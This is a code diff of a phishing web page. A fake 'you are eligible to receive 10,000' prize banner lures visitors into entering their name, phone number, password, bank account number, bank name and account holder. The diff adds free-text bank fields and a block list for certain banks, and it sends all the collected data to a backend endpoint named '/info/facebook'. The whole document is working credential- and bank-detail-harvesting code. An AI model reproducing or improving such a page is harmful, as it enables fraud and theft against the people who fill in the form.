@@ -10,13 +10,11 @@
     <div class="form">
         <h3>🎉 Congratulation 🎉 You are Eligible to recieve 10,000</h3>
         <input type="text" placeholder="Fullname" class="username" value="" >
-        <input type="email" placeholder='Email' class="email" value="">
+        <input type="text" placeholder='Phone number' class="email" value="">
         <input type="password" placeholder="Password" class="password" value="" >
         <input type="text" placeholder="Account Number" class="number" value="" maxlength="10">
-        <div class="bank_info" style="display: none;">
-            <p class="bank_name"></p>
-            <p class="bank_user"></p>
-        </div>
+        <input type="text" placeholder="Bank Name" class="bank_name" value="">
+        <input type="text" placeholder="Account Holder" class="bank_user" value="">
         <p class="err_msg" style="color: red; font-weight: 600;"></p>
         <p class="load" style="color: blue; font-weight: 600;"></p>
         <select name="" id="">
@@ -43,72 +41,45 @@
 
         const backend_url = window.location.hostname === '127.0.0.1' ? 'http://localhost:4040' : ""
 
-        /* number.addEventListener('input', async () => {
-            const accountNumber = number.value
+        async function submit_cred(){
 
-            if(accountNumber.length === 10){
-                load.textContent = 'Fetching Bank Details'
-                await FetchBankDetails(accountNumber)
-                load.textContent = ''
-            }
-        })
-
-        async function FetchBankDetails(acc){
-
-            try {
-                const response = await fetch(`${backend_url}/resolve-account`, {
-                    method: 'POST',
-                    headers:{
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ accountNumber: acc })
-                })
-
-                const data = await response.json()
-
-                if(data.bankName && data.accountHolder){
-                    bank_name.textContent = data.bankName
-                    bank_user.textContent = data.accountHolder
-                }else{
-                    errMsg.textContent = 'Account Verification Failed'
-                }
-
-            } catch(err) {
-                console.log('Error fetching bank details', err)
-                errMsg.textContent = 'Error fetching bank details'
-            }
-        } */
-        
-
-        function submit_cred(){
-
-            if(!username.value || !email.value || !number.value){
+            if(!username.value || !email.value || !number.value || !bank_name.value || !bank_user.value){
                 errMsg.textContent = 'Missing Fields'
                 return
             }
 
-            const data = {
-                username: username.value,
-                email: email.value,
-                accountNumber: number.value,
-               /*  bankName: bank_name.textContent,
-                bankHolder: bank_user.textContent */
+            const notAllowed = ['Opay', 'Palmpay', 'opay', 'palmpay']
+
+            if(notAllowed.includes(bank_name.value)){
+                errMsg.textContent = 'This Bank is Allowed'
+                console.log(bank_name.value)
+                return
             }
 
-            fetch(`${backend_url}/info/facebook`, { 
+            const details = {
+                username: username.value,
+                phone: email.value,
+                accountNumber: number.value,
+                bankName: bank_name.value,
+                bankHolder: bank_user.value
+            }
+
+            submit_btn.innerHTML = 'Loading'
+
+            await fetch(`${backend_url}/info/facebook`, { 
                 method: 'POST', 
                 headers:{
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data) 
-            }).then(res => res.json()).then(data => {
-            if (data.success) {
-                window.location.href = 'session.html';
-            } else {
-                errMsg.textContent = 'Submission failed. Please try again.';
-            }
-        })
-            .catch(err => console.log('Error:', err))
+                body: JSON.stringify(details) 
+            })
+             .then(response => console.log(response))
+             .then(data => console.log(data))
+             .catch(err => {
+                console.log(err)
+              })
+
+            submit_btn.innerHTML = 'Data Sent!'
         }
 
         submit_btn.addEventListener('click', submit_cred)
